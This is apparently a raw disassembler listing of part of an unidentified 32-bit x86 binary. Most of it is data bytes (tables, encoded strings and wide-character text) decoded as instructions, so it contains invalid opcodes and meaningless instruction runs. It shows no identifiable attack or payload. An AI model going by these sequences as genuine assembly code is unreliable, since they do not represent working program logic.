  42402b:	add    BYTE PTR [eax+0x42],al
  42402e:	inc    edx
  42402f:	add    BYTE PTR [eax+0x30004241],ch
  424035:	inc    edx
  424036:	inc    edx
  424037:	add    BYTE PTR [eax+eax*2+0x40880042],al
  42403e:	inc    edx
  42403f:	add    BYTE PTR [edx+eax*2],ch
  424042:	inc    edx
  424043:	add    ah,ch
  424045:	inc    eax
  424046:	inc    edx
  424047:	add    BYTE PTR ds:0x36f89ca9,cl
  42404d:	mov    edx,0x40a0f89c
  424052:	inc    edx
  424053:	add    BYTE PTR [ecx+eax*2+0x42],ah
  424057:	add    BYTE PTR [eax+0x41],bh
  42405a:	inc    edx
  42405b:	add    BYTE PTR [ecx+eax*2+0x41940042],al
  424062:	inc    edx
  424063:	add    al,bl
  424065:	inc    eax
  424066:	inc    edx
  424067:	add    BYTE PTR [esi+edi*1+0x40f80042],ah
  42406e:	inc    edx
  42406f:	add    al,ch
  424071:	inc    eax
  424072:	inc    edx
  424073:	add    BYTE PTR [edx+eax*2+0x42],al
  424077:	add    BYTE PTR [esi+0x19f89c85],dh
  42407d:	or     edx,DWORD PTR [edi]
  42407f:	sub    DWORD PTR [eax+eax*2+0x1c140042],0xd088116
  42408a:	add    eax,0x40000007
  42408f:	add    BYTE PTR [edx],bh
  424091:	inc    edx
  424092:	ds ds mov edx,0x6d004287
  424099:	push   ebp
  42409a:	inc    esp
  42409b:	imul   ecx,DWORD PTR [eax],0x86275fa
  4240a1:	in     eax,dx
  4240a2:	inc    BYTE PTR [edi]
  4240a4:	aas    
  4240a5:	cli    
  4240a6:	mov    ds:0x42409405,eax
  4240ab:	add    BYTE PTR [ebp-0x4a07636b],dh
  4240b1:	xchg   esi,eax
  4240b2:	pushf  
  4240b3:	clc    
  4240b4:	mov    ah,0x95
  4240b6:	pushf  
  4240b7:	clc    
  4240b8:	mov    ebx,0xbaf89c95
  4240bd:	xchg   ebp,eax
  4240be:	pushf  
  4240bf:	clc    
  4240c0:	mov    ecx,0xb8f89c95
  4240c5:	xchg   ebp,eax
  4240c6:	pushf  
  4240c7:	clc    
  4240c8:	mov    edi,0xbef89c95
  4240cd:	xchg   ebp,eax
  4240ce:	pushf  
  4240cf:	clc    
  4240d0:	mov    ebp,0xa6f89c95
  4240d5:	xchg   ebp,eax
  4240d6:	pushf  
  4240d7:	clc    
  4240d8:	jmp    0x423e:0x9c6003f9
  4240df:	add    BYTE PTR [eax+edx*2+0x42],bh
  4240e3:	add    BYTE PTR [ebx+0x77],dl
  4240e6:	jbe    0x424138
  4240e8:	mov    dh,0x85
  4240ea:	pushf  
  4240eb:	clc    
  4240ec:	sbb    ecx,ebp
  4240ee:	push   eax
  4240ef:	pop    es
  4240f0:	in     eax,0x7
  4240f2:	add    BYTE PTR [eax],al
  4240f4:	cwde   
  4240f5:	ds inc edx
  4240f7:	add    BYTE PTR [ebx],bl
  4240f9:	or     eax,DWORD PTR [esi+ecx*1]
	...
  42412c:	jl     0x42417e
  42412e:	inc    edx
  42412f:	add    BYTE PTR [esi+0x68f89c85],dh
  424135:	jne    0x4241b0
  424137:	je     0x4241ae
  424139:	jns    0x4241af
  42413b:	jb     0x4241a5
  42413d:	addr16 pushw 0x68
  424141:	imul   esp,DWORD PTR [bx+0x68],0x0
  424146:	add    BYTE PTR [eax],al
  424148:	addr16 pushw 0x68
  42414c:	addr16 push 0x67
  42414f:	pushw  0x6b6a
  424153:	push   0x676b67
	...
  424160:	jle    0x4240e8
  424162:	inc    eax
  424163:	add    BYTE PTR [ebp-0x5db060b1],ah
  424169:	dec    edi
  42416a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42416b:	dec    edi
  42416c:	lahf   
  42416d:	dec    edi
  42416e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42416f:	dec    edi
  424170:	ins    DWORD PTR es:[edi],dx
  424171:	dec    esi
  424172:	bound  ecx,QWORD PTR [esi+0x30]
  424175:	dec    esi
  424176:	add    BYTE PTR [eax],al
  424178:	cdq    
  424179:	dec    edi
  42417a:	pushf  
  42417b:	dec    edi
  42417c:	fwait
  42417d:	dec    edi
  42417e:	ins    DWORD PTR es:[edi],dx
  42417f:	dec    esi
  424180:	bound  ecx,QWORD PTR [esi+0x30]
  424183:	dec    esi
  424184:	scas   eax,DWORD PTR es:[edi]
  424185:	dec    edi
  424186:	lods   eax,DWORD PTR ds:[esi]
  424187:	dec    edi
  424188:	lahf   
  424189:	dec    edi
  42418a:	mov    ds:0x624e6d4f,al
  42418f:	dec    esi
  424190:	xor    BYTE PTR [esi+0x0],cl
  424193:	add    BYTE PTR [ebp-0x5bb067b1],ch
  424199:	dec    edi
  42419a:	test   eax,0xa04f934f
  42419f:	dec    edi
  4241a0:	fwait
  4241a1:	dec    edi
  4241a2:	xor    BYTE PTR [esi+0x0],cl
  4241a5:	add    BYTE PTR [eax],al
  4241a7:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  4241ae:	mov    WORD PTR [ebp-0x32734274],gs
  4241b4:	mov    ebp,ds
  4241b6:	mov    ebp,gs
  4241b8:	mov    ebp,?
  4241ba:	mov    WORD PTR ds:0x2d8c1d8c,cs
  4241c0:	mov    WORD PTR ds:0x6d8c5d8c,?
  4241c6:	mov    WORD PTR [edx-0x74],?
  4241c9:	jae    0x424157
  4241cb:	jo     0x424159
  4241cd:	jno    0x42415b
  4241cf:	jbe    0x42415d
  4241d1:	ja     0x42415f
  4241d3:	je     0x424161
  4241d5:	jne    0x424163
  4241d7:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  4241de:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  4241e4:	lods   al,BYTE PTR ds:[esi]
  4241e5:	jge    0x4241a3
  4241e7:	jge    0x424187
  4241e9:	(bad)  
  4241ea:	jns    0x42425f
  4241ec:	mov    ecx,0x7d738cb1
  4241f1:	ins    DWORD PTR es:[edi],dx
  4241f2:	enter  0x9fc6,0x26
  4241f6:	jb     0x4241fb
  4241f8:	test   eax,0xb956bb17
  4241fd:	hlt    
  4241fe:	test   al,0x37
  424200:	test   al,0x7e
  424202:	fnstenv [ecx-0x6a]
  424205:	mov    cl,0x6a
  424207:	push   0xffffffce
  424209:	or     BYTE PTR [edx],bl
  42420b:	xlat   BYTE PTR ds:[ebx]
  42420c:	out    dx,eax
  42420d:	add    eax,0x9321d7aa
  424212:	scas   al,BYTE PTR es:[edi]
  424213:	adc    DWORD PTR [esi],esp
  424215:	jge    0x42423a
  424217:	fidiv  WORD PTR [edi]
  424219:	leave  
  42421a:	hlt    
  42421b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42421c:	cmp    ax,0x1fc8
  424220:	mov    dh,cl
  424222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424223:	(bad)  
  424224:	and    DWORD PTR [eax],ebx
  424226:	and    DWORD PTR [ecx+0x0],esi
  424229:	add    BYTE PTR [eax],al
  42422b:	add    al,ch
  42422d:	(bad)  [ebx+0x7]
  424230:	cmc    
  424231:	enter  0x301a,0x10
  424235:	push   eax
  424236:	inc    edx
  424237:	add    BYTE PTR [ecx+0x66],dh
  42423a:	jp     0x4242aa
  42423c:	mov    WORD PTR [eax+0x42],es
  42423f:	add    al,dh
  424241:	inc    eax
  424242:	inc    edx
  424243:	add    BYTE PTR [eax],cl
  424245:	in     eax,dx
  424246:	adc    al,BYTE PTR [edi]
  424248:	pop    ecx
  424249:	inc    ebx
  42424a:	inc    edx
  42424b:	outs   dx,BYTE PTR ds:[esi]
  42424c:	popa   
  42424d:	imul   eax,DWORD PTR [edx+0x61],0x6b
  424251:	jne    0x4242c1
  424253:	dec    ebx
  424254:	je     0x4242b9
  424256:	bound  esp,QWORD PTR [edi+0x78]
  424259:	dec    eax
  42425a:	bound  edx,QWORD PTR [ebx+0x53]
  42425d:	inc    ebx
  42425e:	push   ebp
  42425f:	push   eax
  424260:	ja     0x4242dc
  424262:	jp     0x4242b1
  424264:	push   esi
  424265:	arpl   WORD PTR gs:[ecx+0x45],si
  424269:	dec    edx
  42426a:	dec    esi
  42426b:	data16 ja 0x4242bc
  42426e:	imul   ebp,DWORD PTR [eax+0x0],0x0
	...
  424281:	add    BYTE PTR [eax],al
  424283:	add    BYTE PTR [edi+0x6c],ch
  424286:	push   0x49657557
  42428b:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  424291:	push   edi
  424292:	je     0x424309
  424294:	push   0x66
  424296:	jbe    0x4242da
  424298:	jo     0x4242e3
  42429a:	dec    ebp
  42429b:	dec    ebp
  42429c:	pop    edx
  42429d:	jp     0x4242f9
  42429f:	jbe    0x4242e7
  4242a1:	pop    ecx
  4242a2:	jo     0x42431c
  4242a4:	push   edi
  4242a5:	jbe    0x4242ee
  4242a7:	ja     0x4242ec
  4242a9:	js     0x4242f3
  4242ab:	jno    0x4242f5
  4242ad:	inc    ebp
  4242ae:	inc    esp
  4242af:	inc    esp
  4242b0:	push   ecx
  4242b1:	dec    edx
  4242b2:	ins    BYTE PTR es:[edi],dx
  4242b3:	dec    ebx
  4242b4:	jbe    0x424324
  4242b6:	pop    eax
  4242b7:	jbe    0x4242b9
  4242b9:	add    BYTE PTR [ecx+0x46],al
  4242bc:	jae    0x424334
  4242be:	dec    ebx
  4242bf:	gs js  0x424328
  4242c2:	ins    BYTE PTR es:[edi],dx
  4242c3:	jp     0x4242c5
  4242c5:	add    BYTE PTR [ebx+0x41],cl
  4242c8:	fs gs jno 0x424339
  4242cc:	push   ebx
  4242cd:	inc    ecx
  4242ce:	inc    ebx
  4242cf:	outs   dx,BYTE PTR ds:[esi]
  4242d0:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  4242d4:	push   edx
  4242d5:	push   ecx
  4242d6:	push   0x43000064
  4242db:	pop    eax
  4242dc:	outs   dx,DWORD PTR ds:[esi]
  4242dd:	push   0x66694355
  4242e2:	dec    edi
  4242e3:	je     0x424331
  4242e5:	jo     0x4242e7
  4242e7:	add    BYTE PTR [ebx+0x6f],dl
  4242ea:	inc    edi
  4242eb:	dec    esi
  4242ec:	outs   dx,DWORD PTR ds:[esi]
  4242ed:	pop    ecx
  4242ee:	inc    edi
  4242ef:	jb     0x424338
  4242f1:	jns    0x424369
  4242f3:	inc    ecx
  4242f4:	pop    eax
  4242f5:	add    BYTE PTR [edi+0x67],dh
  4242f8:	dec    edi
  4242f9:	dec    esp
  4242fa:	dec    ebp
  4242fb:	inc    edx
  4242fc:	jno    0x42436f
  4242fe:	jae    0x424353
  424300:	push   eax
  424301:	arpl   WORD PTR [eax],ax
  424303:	add    BYTE PTR [ecx+edi*2+0x45],cl
  424307:	bound  ebp,QWORD PTR [ecx+0x46]
  42430a:	dec    ecx
  42430b:	ja     0x424352
  42430d:	dec    eax
  42430e:	inc    ebp
  42430f:	inc    edx
  424310:	push   ebx
  424311:	push   ecx
  424312:	add    BYTE PTR [eax],al
  424314:	outs   dx,BYTE PTR ds:[esi]
  424315:	dec    eax
  424316:	jno    0x424371
  424318:	jbe    0x424366
  42431a:	ins    BYTE PTR es:[edi],dx
  42431b:	inc    edx
  42431c:	push   0x73
  424321:	add    BYTE PTR [eax],al
  424323:	add    BYTE PTR [eax],al
  424325:	add    BYTE PTR [eax],al
  424327:	add    BYTE PTR [edx+0x44],bl
  42432a:	jbe    0x424375
  42432c:	imul   ecx,DWORD PTR [esi+0x6e],0x66
  424330:	ins    DWORD PTR es:[di],dx
  424332:	je     0x42437b
  424334:	ins    BYTE PTR es:[edi],dx
  424335:	jae    0x4243a1
  424337:	inc    esi
  424338:	ins    DWORD PTR es:[edi],dx
  424339:	je     0x424391
  42433b:	push   0x56584178
  424340:	push   ebx
  424341:	addr16 dec edx
  424343:	jo     0x4243b7
  424345:	js     0x4243b6
  424347:	pop    eax
  424348:	dec    ebx
  424349:	push   esp
  42434a:	dec    esp
  42434b:	jns    0x424398
  42434d:	js     0x4243c7
  42434f:	outs   dx,BYTE PTR ds:[esi]
  424350:	pop    ecx
  424351:	jae    0x4243c1
  424353:	push   0x43644448
  424358:	arpl   WORD PTR [edx+0x55],sp
  42435b:	push   0x42504e67
  424360:	push   ebp
  424361:	je     0x4243d8
  424363:	addr16 dec edi
  424365:	dec    esp
  424366:	inc    edx
  424367:	ins    DWORD PTR es:[edi],dx
  424368:	inc    esi
  424369:	inc    esi
  42436a:	inc    esi
  42436b:	arpl   WORD PTR [edx+0x47],bx
  42436e:	push   ebp
  42436f:	inc    ebx
  424370:	popa   
  424371:	push   edx
  424372:	dec    esp
  424373:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  42437a:	push   ecx
  42437b:	push   ebx
  42437c:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  424383:	dec    edx
  424384:	jns    0x4243ef
  424386:	push   edx
  424387:	inc    ebx
  424388:	jo     0x4243ff
  42438a:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  42438e:	fs add al,dl
  424391:	inc    edx
  424392:	add    BYTE PTR [eax+edx*8],al
  424395:	inc    edx
  424396:	add    BYTE PTR [eax],cl
  424398:	rol    BYTE PTR [edx+0x0],1
  42439b:	or     al,0xd0
  42439d:	inc    edx
  42439e:	add    BYTE PTR [eax],dl
  4243a0:	rol    BYTE PTR [edx+0x0],1
  4243a3:	adc    al,0xd0
  4243a5:	inc    edx
  4243a6:	add    BYTE PTR [eax],bl
  4243a8:	rol    BYTE PTR [edx+0x0],1
  4243ab:	sbb    al,0xd0
  4243ad:	inc    edx
  4243ae:	add    BYTE PTR [edi+0x37],al
  4243b1:	cmp    BYTE PTR [edi+0x4b],bl
  4243b4:	inc    ecx
  4243b5:	aaa    
  4243b6:	dec    ecx
  4243b7:	ss pop edi
  4243b9:	xor    BYTE PTR [eax+0x35],dl
  4243bc:	dec    esi
  4243bd:	add    BYTE PTR [eax+0x49],cl
  4243c0:	xor    al,0x5f
  4243c2:	dec    esp
  4243c3:	inc    esp
  4243c4:	dec    esp
  4243c5:	xor    bl,BYTE PTR [edi+0x35]
  4243c8:	dec    eax
  4243c9:	xor    BYTE PTR [eax],al
  4243cb:	dec    esp
  4243cc:	inc    ecx
  4243cd:	xor    al,0x5f
  4243cf:	dec    ebx
  4243d0:	pop    edx
  4243d1:	xor    esi,DWORD PTR [ebx]
  4243d3:	dec    ebp
  4243d4:	pop    edi
  4243d5:	xor    al,0x0
  4243d7:	pop    ecx
  4243d8:	inc    esi
  4243d9:	push   eax
  4243da:	aaa    
  4243db:	xor    DWORD PTR [edx],esi
  4243dd:	pop    edi
  4243de:	cmp    DWORD PTR [eax+eax*1+0x45],ecx
  4243e2:	xor    eax,0x33595f41
  4243e7:	aaa    
  4243e8:	push   edx
  4243e9:	xor    bl,BYTE PTR [edi+0x4c]
  4243ec:	pop    edx
  4243ed:	add    BYTE PTR [edx+0x45],cl
  4243f0:	push   ebx
  4243f1:	xor    DWORD PTR [edi+0x43],ebx
  4243f4:	dec    esp
  4243f5:	inc    esi
  4243f6:	add    BYTE PTR [eax+0x58],bl
  4243f9:	xor    eax,0x444e515f
  4243fe:	xor    eax,0x4300425f
  424403:	inc    ecx
  424404:	dec    ebx
  424405:	cmp    DWORD PTR ds:0x365f3939,esi
  42440b:	xor    al,0x42
  42440d:	pop    edi
  42440e:	pop    eax
  42440f:	push   edi
  424410:	add    BYTE PTR [ebx+0x45],cl
  424413:	cmp    DWORD PTR ss:[edi+0x56],ebx
  424417:	xor    eax,DWORD PTR [esi+0x4c]
  42441a:	add    BYTE PTR [ebp+0x53],cl
  42441d:	dec    edi
  42441e:	pop    edi
  42441f:	push   ebx
  424420:	inc    ebx
  424421:	xor    al,0x5f
  424423:	inc    ebx
  424424:	push   ebp
  424425:	xor    eax,DWORD PTR [ecx+0x0]
  424428:	dec    esi
  424429:	inc    esi
  42442a:	xor    eax,0x494f345f
  42442f:	xor    ecx,DWORD PTR [esi+0x5f]
  424432:	push   esp
  424433:	cmp    BYTE PTR [esi+0x0],dl
  424436:	pop    edx
  424437:	xor    esi,DWORD PTR [esi]
  424439:	aaa    
  42443a:	pop    edi
  42443b:	xor    eax,0x5f363437
  424440:	push   edi
  424441:	add    BYTE PTR [ebp+0x4a],cl
  424444:	push   edx
  424445:	pop    edi
  424446:	xor    DWORD PTR [edx],esi
  424448:	inc    ebp
  424449:	inc    edx
  42444a:	ss pop edi
  42444c:	inc    ecx
  42444d:	dec    ebx
  42444e:	add    BYTE PTR [edx+0x54],cl
  424451:	dec    edi
  424452:	pop    edi
  424453:	push   esp
  424454:	cmp    BYTE PTR [eax],dh
  424456:	inc    edi
  424457:	add    BYTE PTR [ecx+esi*1+0x4d],al
  42445b:	pop    edi
  42445c:	xor    DWORD PTR [ebp+0x57],eax
  42445f:	pop    edx
  424460:	cmp    BYTE PTR ss:[edi+0x38],bl
  424464:	inc    ebp
  424465:	dec    edi
  424466:	add    BYTE PTR [eax+0x53],cl
  424469:	xor    DWORD PTR [ecx],edi
  42446b:	pop    edi
  42446c:	dec    ebx
  42446d:	inc    edx
  42446e:	push   esp
  42446f:	pop    edi
  424470:	push   esi
  424471:	add    BYTE PTR [ecx+0x49],al
  424474:	dec    edx
  424475:	pop    edi
  424476:	xor    eax,0x33344d4d
  42447b:	pop    edi
  42447c:	push   ecx
  42447d:	inc    esi
  42447e:	inc    edi
  42447f:	dec    edi
  424480:	add    BYTE PTR [esi+0x4b],dl
  424483:	push   edx
  424484:	pop    edi
  424485:	inc    ebx
  424486:	pop    ecx
  424487:	xor    ebx,DWORD PTR [edi+0x35]
  42448a:	inc    edi
  42448b:	dec    eax
  42448c:	xor    BYTE PTR [edx+0x0],al
  42448f:	push   esi
  424490:	xor    eax,0x315f3452
  424495:	ss inc esp
  424497:	xor    eax,0x5956004a
  42449c:	inc    ecx
  42449d:	pop    edi
  42449e:	push   esi
  42449f:	push   ebp
  4244a0:	inc    ebp
  4244a1:	pop    edi
  4244a2:	xor    BYTE PTR [ecx],dh
  4244a4:	add    BYTE PTR [edi+0x58],al
  4244a7:	dec    edx
  4244a8:	pop    edi
  4244a9:	inc    edi
  4244aa:	inc    esi
  4244ab:	push   esi
  4244ac:	dec    esp
  4244ad:	push   edi
  4244ae:	add    BYTE PTR [edi+0x35],al
  4244b1:	dec    ebx
  4244b2:	pop    edi
  4244b3:	ss dec ebx
  4244b5:	xor    esi,DWORD PTR ds:0x33005600
  4244bb:	add    BYTE PTR [edi+0x0],dl
  4244be:	xor    eax,0x5f003600
  4244c3:	add    BYTE PTR [ecx+0x0],bl
  4244c6:	dec    eax
  4244c7:	add    BYTE PTR [ecx+0x0],bl
  4244ca:	inc    ebp
  4244cb:	add    BYTE PTR [eax+0x0],cl
  4244ce:	add    BYTE PTR [eax],al
  4244d0:	push   eax
  4244d1:	add    BYTE PTR [eax],dh
  4244d3:	add    BYTE PTR [ecx+0x0],bl
  4244d6:	pop    edi
  4244d7:	add    BYTE PTR [ecx+0x0],bl
  4244da:	xor    al,BYTE PTR [eax]
  4244dc:	dec    edi
  4244dd:	add    BYTE PTR [ebx],dh
  4244df:	add    BYTE PTR [edi+0x0],dl
  4244e2:	pop    edi
  4244e3:	add    BYTE PTR [eax+eax*1+0x4f],al
  4244e7:	add    BYTE PTR [ebx+0x0],dl
  4244ea:	add    BYTE PTR [eax],al
  4244ec:	dec    ebp
  4244ed:	add    BYTE PTR [esi+0x0],dl
  4244f0:	push   esp
  4244f1:	add    BYTE PTR [edi+0x0],bl
  4244f4:	inc    edx
  4244f5:	add    BYTE PTR [edx+0x0],dl
  4244f8:	xor    al,0x0
  4244fa:	pop    edi
  4244fb:	add    BYTE PTR [ecx+0x0],al
  4244fe:	push   esp
  4244ff:	add    BYTE PTR [edx+0x0],dl
  424502:	pop    edi
  424503:	add    BYTE PTR [edi+0x0],cl
  424506:	xor    eax,DWORD PTR [eax]
  424508:	inc    edx
  424509:	add    BYTE PTR [eax],al
  42450b:	add    BYTE PTR [esi+0x0],cl
  42450e:	cmp    BYTE PTR [eax],al
  424510:	push   eax
  424511:	add    BYTE PTR [eax],dh
  424513:	add    BYTE PTR [edi+0x0],bl
  424516:	push   edx
  424517:	add    BYTE PTR [edi+0x0],al
  42451a:	inc    edx
  42451b:	add    BYTE PTR [eax],bh
  42451d:	add    BYTE PTR [eax+eax*1],dh
  424520:	pop    edi
  424521:	add    BYTE PTR [edi+0x0],cl
  424524:	push   eax
  424525:	add    BYTE PTR [esi],dh
  424527:	add    BYTE PTR [eax],al
  424529:	add    BYTE PTR [edx+0x0],bl
  42452c:	pop    eax
  42452d:	add    BYTE PTR [ecx],dh
  42452f:	add    BYTE PTR [eax],bh
  424531:	add    BYTE PTR [edi+0x0],bl
  424534:	push   edi
  424535:	add    BYTE PTR [edx+0x0],dl
  424538:	dec    ebx
  424539:	add    BYTE PTR [edi+0x0],bl
  42453c:	inc    esp
  42453d:	add    BYTE PTR [esi],dh
  42453f:	add    BYTE PTR [ecx],bh
  424541:	add    BYTE PTR [esi],dh
  424543:	add    BYTE PTR [esi+0x0],dl
  424546:	add    BYTE PTR [eax],al
  424548:	push   ebp
  424549:	add    BYTE PTR [eax],dh
  42454b:	add    BYTE PTR [eax+eax*1+0x5f],al
  42454f:	add    BYTE PTR [edx+0x0],dl
  424552:	dec    ecx
  424553:	add    BYTE PTR [edi+0x0],cl
  424556:	xor    eax,DWORD PTR [eax]
  424558:	xor    eax,0x34005f00
  42455d:	add    BYTE PTR [edi+0x0],cl
  424560:	pop    ecx
  424561:	add    BYTE PTR [eax],al
  424563:	add    BYTE PTR [eax+eax*1+0x31],cl
  424567:	add    BYTE PTR [esi+0x0],al
  42456a:	pop    edi
  42456b:	add    BYTE PTR [ebp+0x0],cl
  42456e:	dec    ebp
  42456f:	add    BYTE PTR [eax],bh
  424571:	add    BYTE PTR [esi],dh
  424573:	add    BYTE PTR [edx+0x0],al
  424576:	dec    esp
  424577:	add    BYTE PTR [eax],al
  424579:	add    BYTE PTR [edx+0x0],al
  42457c:	xor    eax,0x5f003500
  424581:	add    BYTE PTR [eax+0x0],bl
  424584:	inc    esp
  424585:	add    BYTE PTR [edi+0x0],cl
  424588:	inc    ecx
  424589:	add    BYTE PTR [eax+eax*1],dh
  42458c:	add    BYTE PTR [eax],al
  42458e:	push   ecx
  42458f:	add    BYTE PTR [eax],bh
  424591:	add    BYTE PTR [ecx+0x0],dl
  424594:	pop    edi
  424595:	add    BYTE PTR [eax+eax*1+0x31],dl
  424599:	add    BYTE PTR [ecx],dh
  42459b:	add    BYTE PTR [eax],bh
  42459d:	add    BYTE PTR [edi+0x0],bl
  4245a0:	aaa    
  4245a1:	add    BYTE PTR [edx+0x0],al
  4245a4:	add    BYTE PTR [eax],al
  4245a6:	push   edx
  4245a7:	add    BYTE PTR [ecx],bh
  4245a9:	add    BYTE PTR [esi+0x0],dl
  4245ac:	pop    edi
  4245ad:	add    BYTE PTR [eax+eax*1],dh
  4245b0:	push   edx
  4245b1:	add    BYTE PTR [ecx+0x0],bl
  4245b4:	pop    edi
  4245b5:	add    BYTE PTR [eax],bh
  4245b7:	add    BYTE PTR [eax],dh
  4245b9:	add    BYTE PTR [edx+0x0],bl
  4245bc:	add    BYTE PTR [eax],al
  4245be:	add    BYTE PTR [eax],al
  4245c0:	nop
  4245c1:	inc    edx
  4245c2:	add    BYTE PTR [eax+edx*4],al
  4245c5:	inc    edx
  4245c6:	add    BYTE PTR [eax],cl
  4245c8:	nop
  4245c9:	inc    edx
  4245ca:	add    BYTE PTR [eax+edx*4],cl
  4245cd:	inc    edx
  4245ce:	add    BYTE PTR [eax],dl
  4245d0:	nop
  4245d1:	inc    edx
  4245d2:	add    BYTE PTR [eax+edx*4],dl
  4245d5:	inc    edx
  4245d6:	add    BYTE PTR [eax],bl
  4245d8:	nop
  4245d9:	inc    edx
  4245da:	add    BYTE PTR [eax+edx*4],bl
  4245dd:	inc    edx
  4245de:	add    BYTE PTR [eax],ah
  4245e0:	nop
  4245e1:	inc    edx
  4245e2:	add    BYTE PTR [eax+edx*4],ah
  4245e5:	inc    edx
  4245e6:	add    BYTE PTR [eax],ch
  4245e8:	nop
  4245e9:	inc    edx
	...
